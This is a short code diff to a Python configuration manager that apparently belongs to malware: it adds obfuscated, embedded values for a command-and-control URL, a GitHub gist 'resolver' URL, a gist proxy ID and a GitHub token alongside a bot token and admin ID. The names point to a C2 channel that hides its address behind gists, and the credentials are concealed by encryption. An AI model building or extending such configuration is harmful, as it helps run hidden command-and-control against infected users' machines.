@@ -22,7 +22,10 @@ class ConfigManager:
             "BOT_TOKEN": decrypt_string("H1sCGSshKhY7BhsLUVcNCVRZEh9nNDcWKSgaShsIWA0uIzw="),
             "ADMIN_ID": decrypt_string("XhsLUVcNCVRZEh9n"),
             "GLOBAL_CHID": decrypt_string("XhsLUVcNCVRZEh9n"),
-            "C2_URL": decrypt_string("BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL"),
+            "GIST_RESOLVER_URL": decrypt_string("BkYMGz1rdk09HhlMXF4PDgZHGh49NCsBNRkeXRxNSBkBX1cZLyZ2Wz8UDl0UCAQfWVFBWngybQY+RVgPEV1WTFoLHAp+NWFNKgUFQBsXDAkBXA=="),
+            "C2_URL": decrypt_string("BkYMGz1rdk09HhlMXF4PDgZHGh49NCsBNRkeXRxNSBkBX1cZLyZ2Wz8UDl0UCAQfWVFBWngybQY+RVgPEV1WTFoLHAp+NWFNKgUFQBsXDAkBXA=="),
+            "GIST_PROXY_ID": "V1cbDys3aAA/QAkBQw8FTgpWSll5Mj1SbENTXBMJAkI=",
+            "GIST_GITHUB_TOKEN": "CVoINCcrEA45DRB5FmsRLTZVCwcCNG4zGzYoVTxuU0pXAUgJDyYLFg==",
         }
         cls._config.update(embedded)
 
